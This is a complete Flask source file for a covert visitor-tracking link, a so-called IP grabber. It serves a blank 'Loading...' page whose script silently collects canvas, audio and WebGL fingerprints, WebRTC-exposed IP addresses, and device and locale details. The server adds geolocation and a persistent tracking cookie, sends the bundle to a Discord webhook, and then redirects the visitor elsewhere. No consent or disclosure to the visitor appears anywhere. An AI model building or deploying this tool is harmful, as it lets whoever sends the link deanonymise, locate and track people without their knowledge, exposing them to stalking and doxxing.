import os
import json
import time
import threading
import uuid
from datetime import datetime, timezone
import requests
from flask import Flask, request, Response, make_response
from dotenv import load_dotenv

load_dotenv(os.path.join(os.path.dirname(__file__), ".env"))

app = Flask(__name__)


# environment variables
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
ADMIN_USER = os.getenv("ADMIN_USER")
ADMIN_PASS = os.getenv("ADMIN_PASS")
REDIRECT_URL = os.getenv("REDIRECT_URL")


# ---------- Discord ----------
def _send_to_discord(payload):
    if not DISCORD_WEBHOOK_URL:
        return
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
    except requests.RequestException:
        pass  

def format_webrtc(webrtc):
    if not isinstance(webrtc, dict):
        return "❌ WebRTC data unavailable"

    if not webrtc.get("supported"):
        return "❌ WebRTC not supported"

    candidates = webrtc.get("candidates", [])

    if not candidates:
        return "⚠️ No ICE candidates exposed"

    lines = []

    for i, candidate in enumerate(candidates, 1):
        candidate_type = candidate.get("type") or "unknown"
        protocol = candidate.get("protocol") or "unknown"
        address = candidate.get("address") or "hidden"
        port = candidate.get("port") or "unknown"

        if candidate_type == "host":
            icon = "🏠"
            description = "Local network candidate"
        elif candidate_type == "srflx":
            icon = "🌍"
            description = "Public/NAT candidate"
        elif candidate_type == "relay":
            icon = "🔄"
            description = "TURN relay candidate"
        else:
            icon = "❓"
            description = "Unknown candidate"

        lines.append(
            f"{icon} **Candidate {i}**\n"
            f"Type: `{candidate_type}` — {description}\n"
            f"Address: `{address}`\n"
            f"Protocol: `{protocol}`\n"
            f"Port: `{port}`"
        )

    return "\n\n".join(lines)[:4000]

def notify_discord(data):
    if not DISCORD_WEBHOOK_URL:
        return

    def clean(value, limit=100):
        if value is None: 
            return "unknown" 

        value = str(value) 

        if not value: 
            return "unknown" 

        return value[:limit]

    
    fields = [ 
        { 
            "name": "IP", 
            "value": clean(data.get("ip")), 
            "inline": True, 
        }, 
        { 
            "name": "Country", 
            "value": clean(data.get("country")), 
            "inline": True, 
        }, 
        { 
            "name": "City", 
            "value": clean(data.get("city")), 
            "inline": True, 
        }, 
        { 
            "name": "ISP", 
            "value": clean(data.get("isp")), 
            "inline": True, 
        }, 
        { 
            "name": "ASN", 
            "value": clean(data.get("asn")), 
            "inline": True, 
        }, 
        { 
            "name": "Browser", 
            "value": clean(data.get("browser")), 
            "inline": True, 
        }, 
        { 
            "name": "OS", 
            "value": clean(data.get("os")), 
            "inline": True, 
        }, 
        { 
            "name": "Device", 
            "value": clean(data.get("device")), 
            "inline": True, 
        }, 
        { 
            "name": "Language", 
            "value": clean(data.get("language")), 
            "inline": True, 
        }, 
        { 
            "name": "Timezone", 
            "value": clean(data.get("timezone")), 
            "inline": True, 
        }, 
        { 
            "name": "Screen", 
            "value": clean(data.get("screen")), 
            "inline": True, 
        }, 
        { 
            "name": "Referrer",
            "value": clean(data.get("referer")),
            "inline": False, 
        }, 
        { 
            "name": "Path", 
            "value": clean(data.get("path")), 
            "inline": True, 
        }, 
        { 
            "name": "Method", 
            "value": clean(data.get("method")), 
            "inline": True, 
        }, 
        { 
            "name": "User-Agent", 
            "value": clean(data.get("user_agent")), 
            "inline": False, 
        }, 
        {
    "name": "Canvas Fingerprint",
    "value": clean(data.get("canvasFingerprint")),
    "inline": False,
},
{
    "name": "Audio Fingerprint",
    "value": clean(data.get("audioFingerprint")),
    "inline": False,
},
{
    "name": "WebGL Vendor",
    "value": clean(data.get("webglVendor")),
    "inline": True,
},
{
    "name": "WebGL Renderer",
    "value": clean(data.get("webglRenderer")),
    "inline": True,
},
{
    "name": "🌐 WebRTC Network",
    "value": format_webrtc(data.get("webrtc")),
    "inline": False,
},
{
    "name": "Visitor ID",
    "value": clean(data.get("visitor_id")),
    "inline": False,
},
{
    "name": "Returning Visitor",
    "value": clean(data.get("returning_visitor")),
    "inline": True,
},
    ]
    payload = { 
        "embeds": [ 
            { 
                "title": "New Visitor", 
                "color": 5814783, 
                "fields": fields, 
                "timestamp": datetime.now(timezone.utc).isoformat(), 
            } 
        ] 
    }
    threading.Thread(target=_send_to_discord, args=(payload,), daemon=True).start()


# Ip of User
def get_client_ip():
    for header in ("CF-Connecting-IP", "True-Client-IP"):
        value = request.headers.get(header)
        if value:
            return value.strip()
    xff = request.headers.get("X-Forwarded-For", "")
    if xff:
        return xff.split(",")[0].strip()
    return request.remote_addr


# HTTP information
def collect_http_data():
    headers = {}

    for key, value in request.headers.items():
        headers[key] = value

    return {
        "ip": get_client_ip(),
        "timestamp": datetime.now( timezone.utc ).isoformat(),
        "method": request.method,
        "path": request.path,
        "query_string": request.query_string.decode( "utf-8", errors="replace" )[:5000],
        "full_url": request.url[:5000],
        "host": request.host,
        "scheme": request.scheme,
        "protocol": request.environ.get( "SERVER_PROTOCOL" ),
        "referer": request.headers.get( "Referer", "" )[:2000],
        "user_agent": request.headers.get( "User-Agent", "" )[:2000],
        "accept": request.headers.get( "Accept", "" )[:1000],
        "accept_language": request.headers.get( "Accept-Language", "" )[:1000],
        "accept_encoding": request.headers.get( "Accept-Encoding", "" )[:1000],
        "content_type": request.headers.get( "Content-Type", "" )[:1000],
        "content_length": request.content_length, "headers": headers, 
    }


def detect_browser(user_agent):
    ua = user_agent.lower()
    if "edg/" in ua:
        return "Microsoft Edge"
    if "opr/" in ua or "opera" in ua:
        return "Opera" 
    if "chrome/" in ua and "chromium" not in ua: 
        return "Google Chrome" 
    if "firefox/" in ua: 
        return "Mozilla Firefox" 
    if "safari/" in ua and "chrome/" not in ua: 
        return "Safari" 
    if "chromium" in ua: 
        return "Chromium" 
    return "Unknown"

def detect_os(user_agent): 
    ua = user_agent.lower() 
    if "windows" in ua: 
        return "Windows" 
    if "android" in ua: 
        return "Android" 
    if "iphone" in ua or "ipad" in ua or "ios" in ua: 
        return "iOS" 
    if "mac os x" in ua: 
        return "macOS" 
    if "linux" in ua: 
        return "Linux" 
    if "cros" in ua: 
        return "ChromeOS" 
    return "Unknown"

def detect_device(user_agent): 
    ua = user_agent.lower() 
    if "ipad" in ua: 
        return "Tablet" 
    if "tablet" in ua: 
        return "Tablet" 
    if ( "mobile" in ua or "iphone" in ua or "android" in ua ): 
        return "Mobile" 
    return "Desktop"

# Ip geolocation
def get_ip_information(ip): 
    if not ip: 
        return {} 
    try: 
        response = requests.get( 
            f"http://ip-api.com/json/{ip}", 
            params={ 
                "fields": 
                  (
                    "status,message,country,countryCode,"
                    "region,regionName,city,zip,lat,lon," 
                    "timezone,isp,org,as,reverse,proxy,hosting" 
                  ) 
                }, 
            timeout=4 
        ) 
        if response.status_code != 200: 
            return {} 
        data = response.json() 
        if data.get("status") != "success": 
            return {} 
        return {
          "country": data.get("country"), 
          "country_code": data.get("countryCode"),
          "region": data.get("regionName"), 
          "city": data.get("city"), "postal_code": data.get("zip"), 
          "latitude": data.get("lat"), "longitude": data.get("lon"), 
          "timezone": data.get("timezone"), "isp": data.get("isp"),
          "organization": data.get("org"), "asn": data.get("as"), 
          "reverse_dns": data.get("reverse"), "proxy": data.get("proxy"),
          "hosting": data.get("hosting"), 
        } 
    except (requests.RequestException, ValueError): 
        return {}


# BROWSER JAVASCRIPT

BROWSER_PAGE = """ <!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
</head>

<body>

<script>
(async function () {

    function safe(value) {
        try {
            return value;
        } catch {
            return null;
        }
    }

    const data = {

    language: safe(navigator.language),
    languages: safe(navigator.languages),

    platform: safe(navigator.platform),
    userAgent: safe(navigator.userAgent),

    cookieEnabled: safe(navigator.cookieEnabled),
    doNotTrack: safe(navigator.doNotTrack),
    online: safe(navigator.onLine),

    hardwareConcurrency:
        safe(navigator.hardwareConcurrency),

    deviceMemory:
        safe(navigator.deviceMemory),

    maxTouchPoints:
        safe(navigator.maxTouchPoints),

    screen:
        safe(`${screen.width}x${screen.height}`),

    screenWidth:
        safe(screen.width),

    screenHeight:
        safe(screen.height),

    availableWidth:
        safe(screen.availWidth),

    availableHeight:
        safe(screen.availHeight),

    colorDepth:
        safe(screen.colorDepth),

    pixelDepth:
        safe(screen.pixelDepth),

    viewportWidth:
        safe(window.innerWidth),

    viewportHeight:
        safe(window.innerHeight),

    devicePixelRatio:
        safe(window.devicePixelRatio),

    timezone:
        safe(
            Intl.DateTimeFormat()
                .resolvedOptions()
                .timeZone
        ),

    timezoneOffset:
        safe(new Date().getTimezoneOffset()),

    darkMode:
        safe(
            window.matchMedia(
                "(prefers-color-scheme: dark)"
            ).matches
        ),

    lightMode:
        safe(
            window.matchMedia(
                "(prefers-color-scheme: light)"
            ).matches
        ),

    reducedMotion:
        safe(
            window.matchMedia(
                "(prefers-reduced-motion: reduce)"
            ).matches
        ),

    touchSupported:
        safe("ontouchstart" in window),

    page:
        safe(window.location.href),

    referrer:
        safe(document.referrer),

    clientTime:
        new Date().toISOString(),

    // Fingerprint signals
    canvasFingerprint:
        await getCanvasFingerprint(),

    webgl:
        safe(getWebGLFingerprint()),

    audioFingerprint:
        await getAudioFingerprint(),
    
    webrtc:
        await getWebRTCDiagnostics()
};

    try {

        const response = await fetch(
            "/collect",
            {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(data)
            }
        );

        // Redirect only after telemetry is sent.
        window.location.replace(
            __REDIRECT_URL__
        );

    } catch (error) {

        // If collection fails, still redirect.
        window.location.replace(
            __REDIRECT_URL__
        );
    }

})();
async function getWebRTCDiagnostics() {
    try {
        if (!window.RTCPeerConnection) {
            return {
                supported: false,
                candidates: []
            };
        }

        const pc = new RTCPeerConnection({
            iceServers: []
        });

        const candidates = [];

        pc.onicecandidate = (event) => {
            if (!event.candidate) return;

            const candidate = event.candidate;

            candidates.push({
                type: candidate.type || null,
                protocol: candidate.protocol || null,
                address: candidate.address || null,
                port: candidate.port || null
            });
        };

        pc.createDataChannel("diagnostic");

        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);

        await new Promise(resolve => setTimeout(resolve, 1000));

        pc.close();

        return {
            supported: true,
            candidates: candidates
        };

    } catch (error) {
        return {
            supported: false,
            error: String(error)
        };
    }
}
async function getCanvasFingerprint() {
        try {
            const canvas = document.createElement("canvas");
            canvas.width = 280;
            canvas.height = 80;

            const ctx = canvas.getContext("2d");
            if (!ctx) return null;

            ctx.textBaseline = "top";
            ctx.font = "16px Arial";
            ctx.fillStyle = "#f60";
            ctx.fillRect(10, 10, 100, 30);

            ctx.fillStyle = "#069";
            ctx.fillText(
                "Browser fingerprint",
                15,
                20
            );

            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillText(
                "canvas-test",
                20,
                45
            );

            return await sha256(canvas.toDataURL());
        } catch {
            return null;
        }
    }


    function getWebGLFingerprint() {
        try {
            const canvas = document.createElement("canvas");

            const gl =
                canvas.getContext("webgl") ||
                canvas.getContext("experimental-webgl");

            if (!gl) {
                return {
                    supported: false
                };
            }

            const debugInfo =
                gl.getExtension("WEBGL_debug_renderer_info");

            let vendor = null;
            let renderer = null;

            if (debugInfo) {
                vendor = gl.getParameter(
                    debugInfo.UNMASKED_VENDOR_WEBGL
                );

                renderer = gl.getParameter(
                    debugInfo.UNMASKED_RENDERER_WEBGL
                );
            }

            return {
                supported: true,
                vendor: vendor,
                renderer: renderer,
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion:
                    gl.getParameter(
                        gl.SHADING_LANGUAGE_VERSION
                    ),
                maxTextureSize:
                    gl.getParameter(
                        gl.MAX_TEXTURE_SIZE
                    ),
                maxViewportDims:
                    Array.from(
                        gl.getParameter(
                            gl.MAX_VIEWPORT_DIMS
                        )
                    )
            };

        } catch {
            return {
                supported: false
            };
        }
    }


    async function getAudioFingerprint() {
        try {
            const AudioContext =
                window.OfflineAudioContext ||
                window.webkitOfflineAudioContext;

            if (!AudioContext) {
                return null;
            }

            const context = new AudioContext(
                1,
                44100,
                44100
            );

            const oscillator =
                context.createOscillator();

            const compressor =
                context.createDynamicsCompressor();

            oscillator.type = "triangle";
            oscillator.frequency.value = 10000;

            compressor.threshold.value = -50;
            compressor.knee.value = 40;
            compressor.ratio.value = 12;
            compressor.attack.value = 0;
            compressor.release.value = 0.25;

            oscillator.connect(compressor);
            compressor.connect(context.destination);

            oscillator.start(0);

            const buffer =
                await context.startRendering();

            const channel =
                buffer.getChannelData(0);

            // Only summarize the result instead of
            // sending the entire audio buffer.
            let sum = 0;
            let weighted = 0;

            const step = Math.max(
                1,
                Math.floor(channel.length / 1000)
            );

            for (
                let i = 0;
                i < channel.length;
                i += step
            ) {
                const value = channel[i];

                sum += Math.abs(value);
                weighted += value * (i + 1);
            }

            return await sha256(
                `${sum}|${weighted}|${channel.length}`
            );

        } catch {
            return null;
        }
    }


    async function sha256(value) {
        try {
            const data =
                new TextEncoder().encode(value);

            const hash =
                await crypto.subtle.digest(
                    "SHA-256",
                    data
                );

            return Array.from(
                new Uint8Array(hash)
            )
                .map(
                    byte =>
                        byte
                            .toString(16)
                            .padStart(2, "0")
                )
                .join("");

        } catch {
            return null;
        }
    }
</script>

</body>
</html>
"""

def get_or_create_visitor_id():
    visitor_id = request.cookies.get("visitor_id")

    if visitor_id:
        return visitor_id, False

    visitor_id = str(uuid.uuid4())
    return visitor_id, True

# visitor route

@app.route("/")
def index():

    start = time.perf_counter()

    data = collect_http_data()

    user_agent = data.get("user_agent", "")

    data["browser"] = detect_browser(user_agent)
    data["os"] = detect_os(user_agent)
    data["device"] = detect_device(user_agent)

    geo = get_ip_information(data.get("ip"))
    data.update(geo)

    data["response_time_ms"] = round(
        (time.perf_counter() - start) * 1000,
        2
    )

    visitor_id, is_new = get_or_create_visitor_id()

    data["visitor_id"] = visitor_id
    data["returning_visitor"] = not is_new

    page = BROWSER_PAGE.replace(
        "__REDIRECT_URL__",
        json.dumps(REDIRECT_URL)
    )

    response = make_response(
        page,
        200
    )

    # First-party persistent visitor identifier.
    if is_new:
        response.set_cookie(
            "visitor_id",
            visitor_id,
            max_age=60 * 60 * 24 * 365,
            httponly=True,
            secure=True,
            samesite="Lax"
        )

    return response


# browser telemetry collection route
@app.route("/collect", methods=["POST"])
def collect():

    try:
        browser_data = request.get_json(
            silent=True
        ) or {}

        server_data = collect_http_data()

        user_agent = server_data.get(
            "user_agent",
            ""
        )

        # Server-side information
        browser_data["ip"] = get_client_ip()

        browser_data["browser"] = detect_browser(
            user_agent
        )

        browser_data["os"] = detect_os(
            user_agent
        )

        browser_data["device"] = detect_device(
            user_agent
        )

        # WebGL data for Discord
        webgl = browser_data.get("webgl")

        if isinstance(webgl, dict):
            browser_data["webglVendor"] = webgl.get(
                "vendor"
            )

            browser_data["webglRenderer"] = webgl.get(
                "renderer"
            )

        browser_data["server_timestamp"] = (
            datetime.now(
                timezone.utc
            ).isoformat()
        )

        # Add IP geolocation
        geo = get_ip_information(
            browser_data["ip"]
        )

        browser_data.update(geo)

        # Add useful HTTP information
        browser_data["method"] = request.method
        browser_data["path"] = request.path
        browser_data["referer"] = server_data.get("referer", "")
        browser_data["user_agent"] = user_agent

        # Do not accept arbitrary huge values
        browser_data = {
            str(k)[:100]: str(v)[:5000]
            for k, v in browser_data.items()
        }

        # Send the combined information to Discord
        notify_discord(browser_data)

        print(
            "\n========== BROWSER TELEMETRY =========="
        )

        print(
            json.dumps(
                browser_data,
                indent=2,
                ensure_ascii=False
            )
        )

        print(
            "========================================\n"
        )

        return {
            "status": "ok"
        }, 200

    except Exception as e:

        print(
            "Telemetry error:",
            str(e)
        )

        return {
            "status": "error"
        }, 400  


# run the app
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)